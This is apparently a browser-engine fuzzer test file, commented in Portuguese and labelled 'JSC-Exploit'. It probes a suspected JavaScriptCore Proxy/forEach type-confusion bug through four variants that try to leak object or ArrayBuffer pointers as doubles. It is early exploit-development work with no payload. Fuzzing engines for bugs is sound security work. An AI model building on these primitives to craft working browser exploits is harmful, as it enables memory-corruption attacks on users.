\'use strict\';\n/**
 * Teste 11 — Proxy forEach Type Confusion EXPLOITAÇÃO
 *
 * Bug confirmado no Teste 3A:
 *   LOG: 0=2; 1=4; 2=6; 3=8; 4=19998.0002
 *   O C++ cacheia o valor ANTES do set trap e usa o retorno
 *   do trap para o cálculo: MARKER * 2 = 19998.0002
 *
 * Estratégia de exploração:
 *   1. Forçar o set trap a retornar um objeto (ponteiro)
 *   2. O C++ interpreta esse ponteiro como double
 *   3. Leak do ponteiro como número (double reinterpretation)
 *
 * Variantes:
 *   A — Retornar objeto no set trap, ler como double
 *   B — Retornar número grande (parece ponteiro), usar como índice
 *   C — Combinar com ArrayBuffer para leak de endereço
 *   D — Re-entrar com delete durante forEach
 */
(function (global) {
  global.FuzzerTests = global.FuzzerTests || {};

  global.FuzzerTests[\'11\'] = {
    id      : 11,
    name    : \'Proxy forEach — Type Confusion EXPLOITAÇÃO (MARKER*2)\',
    category: \'JSC-Exploit\',
    timeout : 5000,

    run: function () {
      var anomalies = [];
      var MARKER    = 9999.0001;

      /* ── Variante A: set trap retorna objeto → C++ lê como double? ── */
      (function variantA() {
        try {
          var target  = [1, 2, 3, 4, 5];
          var leaked  = null;

          var proxy = new Proxy(target, {
            set: function (t, prop, val, recv) {
              if (prop === \'4\') {
                /* Em vez de retornar o valor normal, retornar um objeto.
                 * Se o C++ usa o retorno do set trap como base para
                 * o cálculo forEach, pode interpretar o ponteiro como double. */
                leaked = { fake: \'object\', idx: 42 };
                return Reflect.set(t, prop, leaked, recv);
              }
              return Reflect.set(t, prop, val, recv);
            }
          });

          proxy.forEach(function (v, i) {
            proxy[i] = v * 2;
          });

          /* Se target[4] for um número estranho (ponteiro reinterpretado),
           * temos type confusion. */
          var final = target[4];
          if (typeof final === \'number\' && final > 1e10) {
            anomalies.push(\'A: POSSÍVEL LEAK DE PONTEIRO: target[4]=\' + final +
              \' (hex-like: \' + final.toString(16) + \')\');
          } else if (typeof final === \'object\') {
            anomalies.push(\'A: objeto sobreviveu no array numérico: \' + JSON.stringify(final));
          }
        } catch (e) {
          anomalies.push(\'A: \' + String(e));
        }
      }());

      /* ── Variante B: número que parece ponteiro → usar como índice ── */
      (function variantB() {
        try {
          var target = [1, 2, 3, 4, 5];
          var fakePointer = 0x414141414141; /* Número grande */

          var proxy = new Proxy(target, {
            set: function (t, prop, val, recv) {
              if (prop === \'4\') {
                return Reflect.set(t, prop, fakePointer, recv);
              }
              return Reflect.set(t, prop, val, recv);
            }
          });

          proxy.forEach(function (v, i) {
            proxy[i] = v * 2;
          });

          var final = target[4];
          if (final === fakePointer * 2) {
            anomalies.push(\'B: fakePointer duplicado: \' + final +
              \' — C++ está usando valor retornado do trap\');
          }
        } catch (e) {
          anomalies.push(\'B: \' + String(e));
        }
      }());

      /* ── Variante C: leak de endereço de ArrayBuffer ── */
      (function variantC() {
        try {
          var buf     = new ArrayBuffer(64);
          var target  = [1, 2, 3, 4, 5];
          var view    = new Uint32Array(buf);
          view[0]     = 0xDEADBEEF;

          /* Tentar colocar o ArrayBuffer no array durante forEach */
          var proxy = new Proxy(target, {
            set: function (t, prop, val, recv) {
              if (prop === \'4\') {
                /* Substituir por uma view do ArrayBuffer */
                return Reflect.set(t, prop, view, recv);
              }
              return Reflect.set(t, prop, val, recv);
            }
          });

          proxy.forEach(function (v, i) {
            proxy[i] = v * 2;
          });

          var final = target[4];
          if (typeof final === \'number\' && final !== view) {
            anomalies.push(\'C: ArrayBuffer view reinterpretado como número: \' + final);
          }
        } catch (e) {
          anomalies.push(\'C: \' + String(e));
        }
      }());

      /* ── Variante D: delete durante forEach → hole confusion ── */
      (function variantD() {
        try {
          var target = [1, 2, 3, 4, 5];
          var proxy = new Proxy(target, {
            set: function (t, prop, val, recv) {
              if (prop === \'2\') {
                delete t[3]; /* Criar hole no meio */
              }
              return Reflect.set(t, prop, val, recv);
            }
          });

          proxy.forEach(function (v, i) {
            proxy[i] = v * 2;
          });

          /* Se o C++ não re-verifica holes, pode acessar índice inválido */
          if (target[3] !== undefined && target[3] !== 8) {
            anomalies.push(\'D: target[3] inesperado após delete: \' + target[3]);
          }
        } catch (e) {
          anomalies.push(\'D: \' + String(e));
        }
      }());

      if (anomalies.length > 0) {
        return { status: \'ANOMALY\', detail: anomalies.join(\' | \') };
      }
      return { status: \'PASS\', detail: \'A-D sem anomalias\' };
    }
  };

}(window));